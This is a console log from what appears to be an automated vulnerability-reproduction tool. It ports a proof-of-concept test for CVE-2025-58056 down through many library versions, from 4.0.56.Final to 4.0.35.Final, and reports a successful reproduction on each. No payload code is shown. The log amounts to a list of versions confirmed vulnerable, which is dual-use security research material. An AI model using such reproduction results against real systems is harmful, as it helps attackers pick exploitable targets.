        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success![0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 4.1.0.Beta1 to 4.0.56.Final successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 4.0.56.Final...[0m
[92m[Executor] Adaptation + reproduction successful on 4.0.56.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.56.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.55.Final[0m
[96m[Selector] Closest reproduced version: 4.0.56.Final at index 77[0m
[96m[Adapter] Trying next closest version: 4.0.55.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.56.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.55.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.55.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.55.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.55.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.55.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.55.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.55.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.55.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.55.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.54.Final[0m
[96m[Selector] Closest reproduced version: 4.0.55.Final at index 76[0m
[96m[Adapter] Trying next closest version: 4.0.54.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.55.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.54.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.54.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.54.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.54.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.54.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.54.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.54.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.54.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.54.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.53.Final[0m
[96m[Selector] Closest reproduced version: 4.0.54.Final at index 75[0m
[96m[Adapter] Trying next closest version: 4.0.53.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.54.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.53.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.53.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.53.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.53.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.53.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.53.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.53.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.53.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.53.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.52.Final[0m
[96m[Selector] Closest reproduced version: 4.0.53.Final at index 74[0m
[96m[Adapter] Trying next closest version: 4.0.52.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.53.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.52.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.52.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.52.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.52.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.52.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.52.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.52.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.52.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.52.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.51.Final[0m
[96m[Selector] Closest reproduced version: 4.0.52.Final at index 73[0m
[96m[Adapter] Trying next closest version: 4.0.51.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.52.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.51.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.51.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.51.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.51.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.51.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.51.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.51.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.51.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.51.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.50.Final[0m
[96m[Selector] Closest reproduced version: 4.0.51.Final at index 72[0m
[96m[Adapter] Trying next closest version: 4.0.50.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.51.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.50.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.50.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.50.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.50.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.50.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.50.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.50.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.50.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.50.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.49.Final[0m
[96m[Selector] Closest reproduced version: 4.0.50.Final at index 71[0m
[96m[Adapter] Trying next closest version: 4.0.49.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.50.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.49.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.49.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.49.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.49.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.49.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.49.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.49.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.49.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.49.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.48.Final[0m
[96m[Selector] Closest reproduced version: 4.0.49.Final at index 70[0m
[96m[Adapter] Trying next closest version: 4.0.48.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.49.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.48.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.48.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.48.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.48.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.48.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.48.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.48.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.48.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.48.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.47.Final[0m
[96m[Selector] Closest reproduced version: 4.0.48.Final at index 69[0m
[96m[Adapter] Trying next closest version: 4.0.47.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.48.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.47.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.47.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.47.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.47.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.47.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.47.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.47.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.47.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.47.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.46.Final[0m
[96m[Selector] Closest reproduced version: 4.0.47.Final at index 68[0m
[96m[Adapter] Trying next closest version: 4.0.46.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.47.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.46.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.46.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.46.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.46.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.46.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.46.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.46.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.46.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.46.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.45.Final[0m
[96m[Selector] Closest reproduced version: 4.0.46.Final at index 67[0m
[96m[Adapter] Trying next closest version: 4.0.45.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.46.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.45.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.45.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.45.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.45.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.45.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.45.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.45.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.45.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.45.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.44.Final[0m
[96m[Selector] Closest reproduced version: 4.0.45.Final at index 66[0m
[96m[Adapter] Trying next closest version: 4.0.44.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.45.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.44.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.44.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.44.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.44.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.44.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.44.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.44.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.44.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.44.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.43.Final[0m
[96m[Selector] Closest reproduced version: 4.0.44.Final at index 65[0m
[96m[Adapter] Trying next closest version: 4.0.43.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.44.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.43.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.43.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.43.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.43.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.43.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.43.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.43.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.43.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.43.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.42.Final[0m
[96m[Selector] Closest reproduced version: 4.0.43.Final at index 64[0m
[96m[Adapter] Trying next closest version: 4.0.42.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.43.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.42.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.42.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.42.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.42.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.42.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.42.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.42.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.42.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.42.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.41.Final[0m
[96m[Selector] Closest reproduced version: 4.0.42.Final at index 63[0m
[96m[Adapter] Trying next closest version: 4.0.41.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.42.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.41.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.41.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.41.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.41.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.41.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.41.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.41.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.41.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.41.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.40.Final[0m
[96m[Selector] Closest reproduced version: 4.0.41.Final at index 62[0m
[96m[Adapter] Trying next closest version: 4.0.40.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.41.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.40.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.40.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.40.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.40.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.40.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.40.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.40.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.40.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.40.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.39.Final[0m
[96m[Selector] Closest reproduced version: 4.0.40.Final at index 61[0m
[96m[Adapter] Trying next closest version: 4.0.39.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.40.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.39.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.39.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.39.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.39.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.39.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.39.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.39.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.39.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.39.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.38.Final[0m
[96m[Selector] Closest reproduced version: 4.0.39.Final at index 60[0m
[96m[Adapter] Trying next closest version: 4.0.38.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.39.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.38.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.38.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.38.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.38.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.38.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.38.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.38.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.38.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.38.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.37.Final[0m
[96m[Selector] Closest reproduced version: 4.0.38.Final at index 59[0m
[96m[Adapter] Trying next closest version: 4.0.37.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.38.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.37.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.37.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.37.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.37.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.37.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.37.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.37.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.37.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.37.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.36.Final[0m
[96m[Selector] Closest reproduced version: 4.0.37.Final at index 58[0m
[96m[Adapter] Trying next closest version: 4.0.36.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.37.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.36.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.36.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.36.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.36.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.36.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.36.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.36.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.36.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.36.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.35.Final[0m
[96m[Selector] Closest reproduced version: 4.0.36.Final at index 57[0m
[96m[Adapter] Trying next closest version: 4.0.35.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.36.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.35.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.35.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.35.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.35.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.35.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.35.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.35.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
